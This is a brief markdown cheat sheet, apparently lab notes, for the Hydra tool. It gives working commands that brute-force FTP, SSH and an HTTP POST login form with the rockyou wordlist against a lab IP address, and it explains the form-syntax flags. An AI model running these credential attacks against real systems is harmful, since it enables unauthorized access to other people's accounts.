# Hydra

### Brute force FTP
```
hydra -l username -P ~/Desktop/Tools/wordlists/rockyou.txt ftp://10.10.174.103
```

### Brute force SSH
```
hydra -l username -P ~/Desktop/Tools/wordlists/rockyou.txt ssh://10.10.174.103
```

### Brute force Post Web Form
```
hydra -l molly -P rockyou.txt 10.10.174.103 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

- http-post-form (the type of form is POST)
- -V (verbose output for every attempt)
- specified username replaces ^USER^, specified password replaces ^PASS^
- F=incorrect appears in server reply when login fails



